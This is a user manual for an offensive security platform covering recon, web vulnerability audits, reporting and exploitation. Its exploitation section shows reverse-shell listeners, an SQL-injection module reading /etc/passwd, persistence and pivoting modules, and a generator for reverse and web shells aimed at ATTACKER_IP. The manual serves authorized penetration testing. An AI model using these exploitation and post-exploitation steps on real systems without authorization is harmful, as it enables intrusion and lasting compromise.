# MarlonTheBug — User Manual

> Offensive Security Auditing & Exploitation Platform  
> Version 1.0.0 — Phase 1: Foundation + Reconnaissance + Web Auditing

---

## TABLE OF CONTENTS

1. [Installation](#1-installation)
2. [Quick Start](#2-quick-start)
3. [Workspace Management](#3-workspace-management)
4. [Reconnaissance](#4-reconnaissance)
5. [Web Auditing](#5-web-auditing)
6. [Exploitation](#6-exploitation)
7. [Reporting](#7-reporting)
8. [Security Utilities](#8-security-utilities)
9. [Custom Plugins & Exploits](#9-custom-plugins--exploits)
10. [Configuration Reference](#10-configuration-reference)
11. [Troubleshooting](#11-troubleshooting)
12. [Best Practices](#12-best-practices)

---

## 1. INSTALLATION

### Prerequisites

- **Python 3.12+** on Linux, macOS, or Windows (WSL)
- **uv** package manager (recommended) or pip

### Installing uv

```bash
# macOS / Linux
curl -LsSf https://astral.sh/uv/install.sh | sh

# Windows (PowerShell)
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
```

### Installing MarlonTheBug

```bash
# Clone the repository
git clone https://github.com/marlonthebug/marlonthebug
cd marlonthebug

# Install dependencies
uv sync

# Install dev dependencies (for testing/development)
uv sync --group dev

# Verify installation
uv run marlonthebug --version
# → MarlonTheBug v1.0.0
```

---

## 2. QUICK START

### Your First Scan (5 minutes)

```bash
# 1. Create a workspace
uv run marlonthebug workspace create --name my-first-scan

# 2. Add your target
uv run marlonthebug workspace add --domains "example.com"

# 3. Run reconnaissance
uv run marlonthebug recon run

# 4. Run web auditing
uv run marlonthebug audit run --category web

# 5. Generate a report
# (Report is auto-generated after each scan — check reports/ directory)
ls reports/

# 6. View workspace info
uv run marlonthebug workspace info
```

### Interactive Console (Recommended)

```bash
# Launch the TUI console
uv run marlonthebug console

# Then inside the console:
marlonthebug> workspace create --name my-scan
marlonthebug> workspace add --domains "example.com"
marlonthebug> recon run
marlonthebug> audit run --category web
marlonthebug> sessions
```

---

## 3. WORKSPACE MANAGEMENT

Workspaces keep your scans organized. Each workspace has its own scope, targets, findings, and sessions.

### Creating and Switching

```bash
# Create a new workspace
uv run marlonthebug workspace create --name "acme-audit"

# Switch to an existing workspace  
uv run marlonthebug workspace switch --name "acme-audit"

# List all workspaces
uv run marlonthebug workspace list

# Show current workspace info
uv run marlonthebug workspace info
```

### Adding Targets

```bash
# Add a single domain
uv run marlonthebug workspace add --domains "example.com"

# Add multiple domains
uv run marlonthebug workspace add --domains "example.com,api.example.com,admin.example.com"

# Add IP ranges
uv run marlonthebug workspace add --ips "10.0.1.0/24,192.168.50.0/28"

# Add both domains and IPs
uv run marlonthebug workspace add \
  --domains "example.com,api.example.com" \
  --ips "10.0.1.0/24"

# Delete a workspace
uv run marlonthebug workspace delete --name "acme-audit"
```

### Scope Configuration

Edit `config/default.yaml` to set scope constraints:

```yaml
scope:
  # Enable exploitation (OFF by default for safety)
  allow_exploitation: false
  
  # Prompt before each exploit action
  require_confirmation: true
  
  # Whitelist specific domains
  allowed_domains:
    - "*.example.com"
    - "api.myapp.io"
  
  # Whitelist IP ranges  
  allowed_ip_ranges:
    - "10.0.1.0/24"
    - "192.168.1.0/24"
  
  # Exclude specific targets
  excluded:
    - "*.cdn.example.com"
    - "10.0.1.255"
```

---

## 4. RECONNAISSANCE

### Full Reconnaissance

```bash
# Run all recon modules against workspace targets
uv run marlonthebug recon run
```

This runs 7 modules automatically:

### Modules Reference

| Module | What It Does | Key Options |
|---|---|---|
| `subdomain_enum` | Certificate Transparency + DNS brute force | `wordlist` (small/medium/large) |
| `dns_bruteforce` | Async DNS resolution with wildcard detection | `record_types` ([A, AAAA, CNAME]) |
| `tech_fingerprint` | Detect 35+ technologies (server, CMS, framework) | Automatic |
| `endpoint_discovery` | Directory/file brute force | `extensions` ([php, asp, js, ...]) |
| `js_analyzer` | Extract endpoints + secrets from JavaScript | `parse_sourcemaps` (true/false) |
| `secret_finder` | Detect 25+ secret types (AWS keys, tokens) | `min_entropy` (default: 4.0) |
| `git_leaks` | .git directory exposure detection | `check_commits` (true/false) |

### Running Individual Modules

From the interactive console:

```bash
marlonthebug> use recon/subdomain_enum
marlonthebug(subdomain_enum)> set wordlist large
marlonthebug(subdomain_enum)> set threads 50
marlonthebug(subdomain_enum)> run
marlonthebug(subdomain_enum)> back
```

### Interpreting Recon Results

```
[+] Recon complete: 171 findings

  Severity breakdown:
    🟡 MEDIUM   48
    🟢 LOW      1
    ⚪ INFO     170

  Plugin breakdown:
    secret_finder        48        ← Worth investigating!
    endpoint_discovery   169       ← Many endpoints discovered
    tech_fingerprint     2         ← Technology stack identified
  
  Targets: 1
    example.com    type=web    tech=nginx
```

- **INFO findings** = normal discovery (endpoints, subdomains, technologies)
- **LOW findings** = minor issues (server version exposed, missing HSTS)
- **MEDIUM findings** = potential vulnerabilities (secrets, sensitive files, missing headers)
- **HIGH/CRITICAL findings** = confirmed vulnerabilities (creadentials, database exposure)

---

## 5. WEB AUDITING

### Running Web Audits

```bash
# Run all web audit modules
uv run marlonthebug audit run --category web

# Run specific categories
uv run marlonthebug audit run --category api
uv run marlonthebug audit run --category auth
```

### Web Audit Modules

| Module | What It Checks | Detection Method |
|---|---|---|
| `sqli` | SQL Injection | Error-based, boolean blind, time-based |
| `xss` | Cross-Site Scripting | Reflected payload detection, context analysis |
| `ssrf` | Server-Side Request Forgery | URL params → internal hosts |
| `csrf` | Cross-Site Request Forgery | Missing tokens in POST forms |
| `path_traversal` | Path Traversal | /etc/passwd, Windows system files |
| `lfi_rfi` | Local/Remote File Inclusion | PHP wrappers, log poisoning paths |
| `ssti` | Server-Side Template Injection | {{7*7}} → 49 check |
| `command_injection` | Command Injection | ; id, | sleep, blind timing |
| `open_redirect` | Open Redirect | Redirect params → external URLs |
| `file_upload` | File Upload | Form analysis, extension checks |
| `deserialization` | Insecure Deserialization | Language-specific error signatures |
| `rce` | Remote Code Execution | Framework endpoints, error patterns |
| `request_smuggling` | HTTP Request Smuggling | CL.TE desync timing |
| `waf_bypass` | WAF Detection | Header/body/cookie signatures |
| `race_conditions` | Race Conditions | Concurrent request testing |
| `business_logic` | Business Logic | Workflow patterns, price fields |

### How to Audit an Authenticated Site

If your target requires authentication (like HTTP Basic Auth):

```bash
# Use the HTTP engine with custom headers
uv run python3 -c "
from marlonthebug.http.client import AsyncHTTPClient
import asyncio, base64

async def main():
    http = AsyncHTTPClient(timeout=10)
    
    # Add Basic Auth header
    credentials = base64.b64encode(b'username:password').decode()
    
    resp = await http.get('https://target.com/admin',
        headers={'Authorization': f'Basic {credentials}'})
    
    print(f'Status: {resp.status_code}')
    print(f'Body: {resp.body[:300]}')
    await http.close()

asyncio.run(main())
"
```

For form-based authentication (login forms with CSRF tokens):

```bash
# Use the full httpx session approach
uv run python3 -c "
import asyncio, re
import httpx
from bs4 import BeautifulSoup

async def main():
    client = httpx.AsyncClient(follow_redirects=True)
    
    # 1. Get login page and CSRF token
    r = await client.get('https://target.com/login')
    soup = BeautifulSoup(r.text, 'lxml')
    token = soup.find('input', {'name': '_token'})['value']
    
    # 2. Login
    await client.post('https://target.com/login', data={
        '_token': token,
        'email': 'your@email.com',
        'password': 'yourpassword',
    })
    
    # 3. Access authenticated page    
    r2 = await client.get('https://target.com/dashboard')
    print(f'Dashboard: HTTP {r2.status_code}, len={len(r2.text)}')
    
    await client.aclose()

asyncio.run(main())
"
```

### Interpreting Audit Results

```
[+] Audit complete: 15 findings

  Severity breakdown:
    🔴 CRITICAL 3      ← Immediate action required
    🟠 HIGH     5      ← Fix urgently
    🟡 MEDIUM   7      ← Fix in next sprint

  Top findings:
    🔴 [CRITICAL] SQL Injection in parameter 'id'
       Endpoint: https://target.com/products
       Evidence: {'parameter': 'id', 'db_type': 'MySQL', ...}
    
    🟠 [HIGH    ] Reflected XSS in parameter 'q'
       Endpoint: https://target.com/search
       Evidence: {'parameter': 'q', 'contexts': ['html_body'], ...}
```

---

## 6. EXPLOITATION

### ⚠️ SAFETY WARNING

Exploitation is **disabled by default**. You must explicitly enable it per workspace and confirm each action. **Never exploit targets you don't own or have explicit written authorization for.**

### Enabling Exploitation

```bash
# In interactive console:
marlonthebug> set ExploitAllowExploitation true
marlonthebug> set ExploitRequireConfirmation true
```

Or edit `config/default.yaml`:

```yaml
exploitation:
  confirm_before_payload: true
  max_concurrent_sessions: 5
  auto_cleanup: true
  log_all_actions: true
```

### Starting a Listener

```bash
# TCP listener (for reverse shells)
uv run marlonthebug listeners start --type tcp --port 4444

# HTTP listener (for blind callbacks)
uv run marlonthebug listeners start --type http --port 8080

# From interactive console:
marlonthebug> listeners start --type tcp --port 4444
```

### Using Exploit Modules

```bash
# 1. Load an exploit module
marlonthebug> use exploit/webapp/sqli_exploit

# 2. Configure parameters
marlonthebug(sqli_exploit)> set target example.com
marlonthebug(sqli_exploit)> set parameter id
marlonthebug(sqli_exploit)> set payload read_file:/etc/passwd

# 3. Check exploitability
marlonthebug(sqli_exploit)> check

# 4. Run the exploit
marlonthebug(sqli_exploit)> run
```

### Managing Sessions

```bash
# List active sessions
marlonthebug> sessions

# Interact with a session
marlonthebug> sessions -i 1

# Inside a shell session:
[www-data@web-prod-01]$ whoami
[www-data@web-prod-01]$ id
[www-data@web-prod-01]$ ls -la /var/www
[www-data@web-prod-01]$ background    # Return to MarlonTheBug
```

### Post-Exploitation

```bash
# Deploy persistence
marlonthebug> use exploit/post/persistence
marlonthebug(persistence)> set session 1
marlonthebug(persistence)> run

# Open SOCKS proxy for pivoting
marlonthebug> use exploit/post/pivot
marlonthebug(pivot)> set session 1
marlonthebug(pivot)> set type socks
marlonthebug(pivot)> set port 1080
marlonthebug(pivot)> run
```

### Exploit Modules Available

| Module | Category | Description |
|---|---|---|
| `sqli_exploit` | webapp | SQLi data extraction + file read |
| `rce_exploit` | webapp | Reverse shell delivery via RCE |
| `upload_exploit` | webapp | Web shell via file upload |
| `ssti_exploit` | webapp | SSTI → RCE chains (Jinja2, Twig, etc.) |
| `lfi_exploit` | webapp | LFI → RCE (log poisoning, wrappers) |

### Payload Generator

```bash
# From Python:
from marlonthebug.exploit.payloads.generator import PayloadGenerator, PayloadConfig, PayloadType, OS

gen = PayloadGenerator()

# Generate reverse shells
config = PayloadConfig(
    payload_type=PayloadType.REVERSE_SHELL,
    target_os=OS.LINUX,
    lhost="10.0.0.1",
    lport=4444,
    encoding="base64",
)
payloads = gen.reverse_shell(config)
for p in payloads:
    print(f"[{p.description}]")
    print(f"  {p.command}")
    print(f"  Encoded: {p.encoded}")

# Generate web shells    
shells = gen.web_shell("php")
for s in shells:
    print(s.command)

# Generate a cheatsheet
cheatsheet = gen.generate_cheatsheet("ATTACKER_IP", 4444)
print(cheatsheet)
```

---

## 7. REPORTING

### Automatic Reports

Reports are generated automatically after each `recon run` and `audit run`:

```
reports/
├── acme-audit_report_20260511_130139.json    ← JSON (machine-readable)
├── acme-audit_report_20260511_130139.md      ← Markdown (human-readable)
└── acme-audit_report_20260511_142350.html    ← HTML (professional)
```

### Manual Report Generation

```bash
# Generate from workspace findings
uv run marlonthebug report generate --format html --output audit-report.html
uv run marlonthebug report generate --format markdown --output audit-report.md
uv run marlonthebug report generate --format json --output audit-report.json
```

### Programmatic Reports

```python
from pathlib import Path
from marlonthebug.output.reports import ReportGenerator
from marlonthebug.plugins.base import Finding, Severity

# Create findings manually
findings = [
    Finding(
        plugin_name="sqli",
        title="SQL Injection in login",
        description="Blind SQL injection in username parameter",
        severity=Severity.CRITICAL,
        cvss_score=9.8,
        endpoint="https://target.com/login",
        target_host="target.com",
        category="web",
        evidence={"parameter": "username", "type": "boolean_blind"},
        remediation="Use parameterized queries",
        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
        waf_rules=["SecRule ARGS \"(?i)select\" \"deny\""],
    ),
]

# Generate reports
gen = ReportGenerator(output_dir=Path("reports"))
gen.generate_json(findings, workspace_name="final-audit")
gen.generate_markdown(findings, workspace_name="final-audit")
gen.generate_html(findings, workspace_name="final-audit")
```

### CVSS 3.1 Scoring

```python
from marlonthebug.output.cvss import CVSS31

# From vector string
cvss = CVSS31.from_vector("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
print(f"Score: {cvss.base_score()}")   # → 9.8
print(f"Severity: {cvss.severity()}")  # → critical

# Quick score calculation
score = CVSS31.quick_score(
    av="N",  # Network
    ac="L",  # Low
    pr="N",  # None  
    ui="N",  # None
    s="U",   # Unchanged
    c="H",   # High confidentiality impact
    i="H",   # High integrity impact
    a="H",   # High availability impact
)
print(f"CVSS 3.1 Score: {score}")  # → 9.8
```

---

## 8. SECURITY UTILITIES

### SSL/TLS Analysis

```bash
uv run python3 -c "
from marlonthebug.utils.ssl_tls import analyze_ssl, ssl_report
import json

# Analyze a target
analysis = analyze_ssl('example.com', 443)
report = ssl_report(analysis)
print(json.dumps(report, indent=2, default=str))
"
```

Output:
```
{
  "host": "example.com",
  "tls_1_0": false, "tls_1_1": false, "tls_1_2": true, "tls_1_3": true,
  "certificate_valid": true,
  "certificate_expiry": "2026-08-06T11:21:53+00:00",
  "hsts_enabled": false,
  "weak_ciphers": [],
  "errors": []
}
```

### Security Header Analysis

```bash
uv run python3 -c "
import asyncio
from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.utils.headers import analyze_headers

async def main():
    http = AsyncHTTPClient(timeout=10)
    resp = await http.get('https://example.com')
    
    analysis = analyze_headers(resp.headers)
    print(f'Security Score: {analysis.score}/100')
    print(f'Present headers: {list(analysis.headers_present.keys())}')
    print(f'Missing headers: {analysis.missing_headers}')
    print(f'Issues: {analysis.issues}')
    
    if analysis.cookie_analysis:
        print(f'Cookie issues: {analysis.cookie_analysis}')
    
    await http.close()

asyncio.run(main())
"
```

### DNS Utilities

```python
from marlonthebug.utils.dns import dns_lookup, dns_lookup_all, check_zone_transfer

# Look up specific records
ips = await dns_lookup("example.com", "A")      # → ["93.184.216.34"]
mx = await dns_lookup("example.com", "MX")       # → ["10 mail.example.com"]

# Look up all records
all_records = await dns_lookup_all("example.com")
# → {"A": [...], "MX": [...], "NS": [...], "TXT": [...]}

# Check zone transfer (rarely works, but worth trying)
records, errors = await check_zone_transfer("example.com")
```

### OOB Collaborator (Blind Vulnerability Detection)

```python
from marlonthebug.collaborator.server import CollaboratorServer

# Start the collaborator server
server = CollaboratorServer(http_port=8080, dns_port=5353)
await server.start()

# Generate a unique token
token = CollaboratorServer.generate_token(16)

# Inject the token in your payloads
payload = f"http://your-collaborator-host:8080/{token}"

# Later, check for callbacks
if server.has_callback(token):
    callbacks = server.get_callbacks(token)
    for cb in callbacks:
        print(f"Callback from {cb.source_ip}: {cb.data}")
```

---

## 9. CUSTOM PLUGINS & EXPLOITS

### Writing a Custom Recon Plugin

Create `marlonthebug/plugins/recon/my_scanner.py`:

```python
"""My custom scanner plugin."""
from typing import AsyncIterator
from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Finding, Severity

class MyCustomScanner(BasePlugin):
    name = "my_scanner"
    version = "1.0.0"
    description = "Scans for custom vulnerability"
    category = "recon"

    async def setup(self, workspace):
        self.workspace = workspace
        self.http = AsyncHTTPClient(timeout=10)

    async def run(self, target, options=None):
        url = f"https://{target.host}/my-endpoint"
        try:
            resp = await self.http.get(url)
            if resp.status_code == 200 and "vulnerable" in resp.body:
                yield Finding(
                    plugin_name=self.name,
                    title="Custom vulnerability found",
                    description=f"Found vulnerable endpoint at {url}",
                    severity=Severity.HIGH,
                    cvss_score=7.5,
                    endpoint=url,
                    target_host=target.host,
                    category=self.category,
                    evidence={"url": url, "status": resp.status_code},
                    remediation="Fix the vulnerability by doing X.",
                )
        except Exception:
            pass

    async def teardown(self):
        await self.http.close()
```

The plugin is **automatically discovered** on next launch — no registration needed.

### Writing a Custom Web Audit Plugin

Create `marlonthebug/plugins/web/my_audit.py`:

```python
"""My custom web audit plugin."""
from marlonthebug.plugins.base import BasePlugin, Finding, Severity
from marlonthebug.http.client import AsyncHTTPClient
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class MyWebAudit(BasePlugin):
    name = "my_web_audit"
    category = "web"
    description = "Custom web vulnerability scanner"

    async def run(self, target, options=None):
        http = AsyncHTTPClient(timeout=10)
        try:
            # Crawl or probe the target
            resp = await http.get(f"https://{target.host}")
            soup = BeautifulSoup(resp.body, "lxml")
            
            for form in soup.find_all("form"):
                action = urljoin(f"https://{target.host}", form.get("action", ""))
                method = form.get("method", "GET").upper()
                
                if method == "POST":
                    # Check for missing security features
                    yield Finding(
                        plugin_name=self.name,
                        title="Potentially vulnerable form found",
                        description=f"POST form at {action}",
                        severity=Severity.MEDIUM,
                        cvss_score=5.0,
                        endpoint=action,
                        target_host=target.host,
                        category=self.category,
                        evidence={"form_action": action, "method": method},
                    )
        finally:
            await http.close()
```

### Writing a Custom Exploit Module

Create `marlonthebug/exploit/webapp/my_exploit.py`:

```python
"""My custom exploit module."""
from marlonthebug.exploit.base import BaseExploit, ExploitResult
from marlonthebug.http.client import AsyncHTTPClient

class MyExploit(BaseExploit):
    name = "my_exploit"
    category = "webapp"
    description = "Exploits my custom vulnerability"
    requires_confirm = True  # Ask user before running

    async def check(self, target, finding):
        """Verify the vulnerability is exploitable."""
        http = AsyncHTTPClient(timeout=10)
        try:
            resp = await http.get(f"https://{target.host}/test")
            return "vulnerable" in resp.body
        finally:
            await http.close()

    async def run(self, target, finding, payload=None):
        """Execute the exploit."""
        http = AsyncHTTPClient(timeout=10)
        try:
            resp = await http.get(
                f"https://{target.host}/exploit?cmd=id"
            )
            if resp.status_code == 200:
                return ExploitResult(
                    success=True,
                    output=f"Command output: {resp.body}",
                )
            return ExploitResult(
                success=False,
                error=f"Exploit failed: {resp.status_code}",
            )
        finally:
            await http.close()
```

### Adding Custom Wordlists

Place your `.txt` wordlist in `marlonthebug/fuzzer/wordlists/`:

```
marlonthebug/fuzzer/wordlists/my-passwords.txt
```

Then use it in your plugin:

```python
def _load_wordlist(self):
    path = "marlonthebug/fuzzer/wordlists/my-passwords.txt"
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]
```

---

## 10. CONFIGURATION REFERENCE

### Full `config/default.yaml`

```yaml
general:
  threads: 50            # Max concurrent requests
  timeout: 10            # HTTP request timeout (seconds)
  retries: 3             # Retry failed requests
  backoff: 2.0           # Exponential backoff multiplier
  verify_ssl: true       # Verify SSL certificates
  follow_redirects: true # Follow HTTP redirects
  max_redirects: 5       # Max redirect chain length

http:
  proxy:
    enabled: false
    http: null            # "http://proxy:8080"
    https: null
    socks: null           # "socks5://proxy:1080"

exploitation:
  confirm_before_payload: true   # Confirm before each exploit
  confirm_before_listener: true  # Confirm before starting listener
  max_concurrent_sessions: 5     # Max active shells
  auto_cleanup: true             # Remove artifacts on disconnect
  log_all_actions: true          # Full audit trail

collaborator:
  enabled: true
  http_port: 8080
  dns_port: 5353

crawler:
  max_depth: 5           # Max crawl depth
  max_pages: 1000        # Max pages to crawl
  respect_robots_txt: true

fuzzer:
  threads: 30
  rate_limit: 0          # Requests per second (0 = no limit)
  recursion_depth: 2     # Directory recursion depth

database:
  url: "sqlite+aiosqlite:///data/marlonthebug.db"

logging:
  level: "INFO"          # DEBUG, INFO, WARNING, ERROR
  file: "logs/marlonthebug.log"
  rotation: "10 MB"
  retention: "30 days"

output:
  formats: ["json", "markdown"]
  include_evidence: true
  include_remediation: true
  output_dir: "reports"
```

---

## 11. TROUBLESHOOTING

### Common Issues

**"No active workspace"**

```bash
# Create or switch to a workspace first
uv run marlonthebug workspace create --name "my-scan"
uv run marlonthebug workspace switch --name "my-scan"
```

**"ModuleNotFoundError: No module named 'marlonthebug'"**

```bash
# Reinstall the package
uv sync
```

**HTTP requests timing out**

```yaml
# Increase timeout in config/default.yaml
general:
  timeout: 30    # Try 30 seconds for slow targets
  retries: 5     # More retries for unstable connections
```

**Target returns 401 (Unauthorized)**

- The target requires authentication. See [Section 5 — How to Audit an Authenticated Site](#how-to-audit-an-authenticated-site)
- Or test a different target that doesn't require auth

**Target behind Cloudflare/WAF**

```python
# The WAF fingerprinting module helps identify this
from marlonthebug.http.waf import WAFFingerprinter

waf = WAFFingerprinter()
result = waf.detect(status_code, headers, body, cookies)
if result.detected:
    print(f"WAF detected: {result.name} (confidence: {result.confidence:.0%})")
```

**SSL certificate errors**

```yaml
# config/default.yaml
general:
  verify_ssl: false    # Disable SSL verification (use with caution)
```

**Rate limiting blocks scan**

```yaml
# Reduce threads and add delays
fuzzer:
  threads: 5
  delay: 0.5          # 500ms between requests
  rate_limit: 2       # Max 2 requests per second
```

**Database errors**

```bash
# Reset the database
rm -rf data/marlonthebug.db

# Or use a fresh database URL
export MTB_DB_URL="sqlite+aiosqlite:///data/clean-scan.db"
```

### Debug Mode

```yaml
# config/default.yaml
logging:
  level: "DEBUG"    # Full debug output
```

```bash
# Or via environment variable
export MTB_LOG_LEVEL=DEBUG
uv run marlonthebug recon run
```

### Running Tests

```bash
# Verify everything works
uv run pytest tests/ -v

# With coverage
uv run pytest tests/ --cov=marlonthebug --cov-report=html
open htmlcov/index.html
```

---

## 12. BEST PRACTICES

### Before Scanning

1. **Always get written authorization** before testing any system
2. **Verify the scope** — only test domains/IPs you own or have permission for
3. **Start with recon** — understand the target before running heavy audits
4. **Check `robots.txt`** — respect exclusion rules unless authorized to ignore them
5. **Use a test environment first** — practice on your own servers before client engagements

### During Scanning

6. **Start slow, then scale up**:
   ```bash
   # First run: low threads
   recon run --threads 5
   # If stable: increase
   recon run --threads 50
   ```

7. **Monitor the target** — if the site becomes slow or unresponsive, **stop immediately**

8. **Keep exploitation disabled** until you've confirmed findings:
   ```yaml
   scope:
     allow_exploitation: false  # Default: OFF
   ```

9. **Use the collaborator server** for blind vulnerability detection — it's safer than active exploitation

10. **Log everything** — the platform logs all actions automatically to `logs/marlonthebug.log`

### After Scanning

11. **Verify findings** — manually confirm critical/high findings before reporting
12. **Remove artifacts** — use `auto_cleanup: true` in config
13. **Rotate any credentials** you may have discovered or used
14. **Generate professional reports** with remediation guidance
15. **Archive the workspace** for future reference

### Security Hygiene

16. **Never commit** `.env` files, `data/` directories, or `reports/` to version control
17. **Use `.gitignore`** — already configured in the project
18. **Rotate API keys** used during testing
19. **Encrypt report files** when storing or sharing
20. **Delete test accounts** created during engagement

---

## QUICK REFERENCE CARD

```bash
# Essential commands
marlonthebug workspace create --name NAME
marlonthebug workspace switch --name NAME
marlonthebug workspace add --domains "example.com"
marlonthebug recon run
marlonthebug audit run --category web
marlonthebug workspace info

# Interactive console
marlonthebug console

# Inside console:
workspace create --name NAME
workspace add --domains "DOMAIN"
use recon/MODULE
use exploit/MODULE
info
set OPTION VALUE
run
back
sessions
sessions -i ID
help

# Generate reports
marlonthebug report generate --format FORMAT

# Utilities (from Python)
from marlonthebug.utils.ssl_tls import analyze_ssl
from marlonthebug.utils.headers import analyze_headers
from marlonthebug.utils.dns import dns_lookup
from marlonthebug.output.cvss import CVSS31
from marlonthebug.http.waf import WAFFingerprinter
from marlonthebug.collaborator.server import CollaboratorServer
from marlonthebug.exploit.payloads.generator import PayloadGenerator
```

---

**Version:** 1.0.0  
**Last updated:** 2026-05-11  
**License:** MIT
